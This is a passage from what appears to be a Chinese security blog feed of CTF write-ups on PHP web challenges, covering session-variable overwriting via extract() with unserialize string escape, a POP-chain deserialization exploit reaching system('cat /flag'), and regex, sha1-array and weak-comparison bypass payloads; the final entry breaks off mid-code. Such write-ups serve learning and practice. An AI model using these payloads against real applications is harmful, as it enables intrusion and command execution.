class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计注意到有不熟悉的玩意<code>$_SESSION</code>和<code>extract()</code><br><code>$_SESSION</code>变量<br>作用是访客与整个网站交互过程中一直存在的公有变量<br><code>extract()</code> 函数<br>作用是从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量<br>更具体的用法参考<a href="https://www.runoob.com/php/func-array-extract.html">https://www.runoob.com/php/func-array-extract.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Original&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>, EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>; <span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>; <span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>; <span class="hljs-subst">$dup_a</span> = <span class="hljs-subst">$dup_a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>结果：<span class="hljs-variable">$a</span> = Original; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse; <span class="hljs-variable">$dup_a</span> = Cat<br></code></pre></td></tr></table></figure><p>在这道题目里这个函数接收了post传输的数据<br>如果你传入的是** _SESSION[flag]** <br>那么他就会覆盖之前的**$_SESSION[“user”]和$_SESSION[“function”]**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-string">&#x27;aa&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-string">&#x27;bb&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-meta">?&gt;</span><br>post：<br>_SESSION[cc]=<span class="hljs-number">1</span><br>结果：<br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;aa&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;bb&quot;</span> &#125; <br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-string">&quot;cc&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span> &#125; <br></code></pre></td></tr></table></figure><p>可以看到post传输的参数里的cc被自动加上了双引号，这里是一个小细节<br><strong>步骤</strong><br>随便给$_SESSION变量赋值看看怎么构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&quot;woai&quot;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;function&quot;</span>] = <span class="hljs-string">&quot;yuanshen&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>);<br>运行结果：<br>a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;woai&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;yuanshen&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>分析一下发现只有user和function的值是可控的，所以我们需要利用可控的值来使得字符串逃逸出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;flagflagflagflagflagflag&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;function&quot;</span>] =<span class="hljs-string">&#x27;1&quot;;s:8:&quot;function&quot;;s:1:&quot;s&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>post传参(_SESSION前面没$是因为加上之后会就导致变量名字变成了$$_SESSION)：<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=1&quot;;s:8:&quot;function&quot;;s:1:&quot;s&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>后面查看源代码提示flag在flag in &#x2F;d0g3_fllllllag<br>然后把传参的img的值改一下就好了</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【FSCTF 2023】ez_php2</title>
    <link href="/2024/08/10/%5BFSCTF%202023%5Dez_php2/"/>
    <url>/2024/08/10/%5BFSCTF%202023%5Dez_php2/</url>
    
    <content type="html"><![CDATA[<p>源码奉上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>Class Rd&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ending</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cl</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;All matters have concluded&quot;</span>;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;ending);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arg</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arg</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt;<span class="hljs-variable">$value</span>)<br>        &#123;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;POC&#x27;</span>]==<span class="hljs-string">&quot;1111&quot;</span>)<br>            &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="hljs-string">&quot;system&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payload</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;payload = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"><span class="hljs-variable">$paylaod</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$paylaod</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Er</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$symbol</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;symbol = True;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$value</span>(<span class="hljs-variable language_">$this</span>-&gt;Flag);<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;start1.<span class="hljs-string">&quot;__construct&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start2===<span class="hljs-string">&quot;11111&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;start1-&gt;<span class="hljs-title function_ invoke__">Love</span>(<span class="hljs-variable">$this</span>-&gt;start);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are Good!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Ha_rde_r&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Ha_rde_r&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You are Silly goose!&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>代码审计构造pop链</strong><br><code>Ha_destruct-&gt;Rd_call-&gt;Er_set</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Class Rd&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ending</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cl</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Er</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$symbol</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Flag</span> = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;POC&quot;</span>=&gt;<span class="hljs-string">&quot;1111&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start2</span>=<span class="hljs-string">&quot;11111&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ha</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Er</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rd</span>();<br><span class="hljs-variable">$a</span>-&gt;start1 = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;start1-&gt;cl = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【鹤城杯 2021】Middle magic</title>
    <link href="/2024/08/10/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic/"/>
    <url>/2024/08/10/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;<br><br>  <span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]);<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, <span class="hljs-variable">$aaa</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-comment">// START FORM PROCESSING    </span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;<br>          <span class="hljs-variable">$level_3</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;level_3&#x27;</span>]);<br><br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$level_3</span>-&gt;result == <span class="hljs-variable">$result</span>) &#123;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.<span class="hljs-variable">$flag</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span>&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// perform validations on the form data</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>&#125;<br><br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这道题有三个if，分别是<br>1.第一个if要求<code>aaa=pass_the_level_1</code><br>2.第二个if要求传入两个不相等变量<code>admin</code>和<code>root_pwd</code>两者sha1加密后相等；<br>3.第三个if要求传入<code>level_3</code>，对其进行json解码之后，需要<code>$level_3-&gt;result == $result</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">json_decode</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$json</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$assoc</span> = <span class="hljs-literal">false</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$depth</span> = <span class="hljs-number">512</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span>]]] )<br><span class="hljs-comment">//json_decode接受一个JSON格式的字符串并且把它转换为PHP变量,当该参数assoc为TRUE时，将返回array，否则返回object。</span><br></code></pre></td></tr></table></figure><p><strong>第一个if</strong><br>因为preg_replace函数只能匹配一行的数据，因此我们只需先传入换行符，那么后面的传入便不再被匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?aaa=%<span class="hljs-number">0</span>apass_the_level_1%<span class="hljs-number">23</span><br><span class="hljs-comment">//这里解释一下%23，这是＃的url编码，直接传入#是不行的，浏览器会将它视作url的指示符号，可以去了解一下url的构成就能理解了（个人的理解，轻点喷）</span><br></code></pre></td></tr></table></figure><p><strong>第二个if</strong><br>直接用数组绕过，sha1加密时，若传入的是数组，返回值为null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">admin[]=<span class="hljs-number">1</span>&amp;root_pwd[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>第三个if</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">level_3=&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-subst">$result</span>&quot;</span>&#125;<br><span class="hljs-comment">//其他师傅的</span><br>level_3=&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>&#125;<br><span class="hljs-comment">//php弱比较在面对纯字符与0的比较时，会返回true，例如&#x27;abc&#x27; == 0返回为true</span><br><span class="hljs-comment">//推测$result是纯字符，因此构造result-&gt;0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第五空间2021---pklovecloud</title>
    <link href="/2024/08/07/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021---pklovecloud/"/>
    <url>/2024/08/07/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021---pklovecloud/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 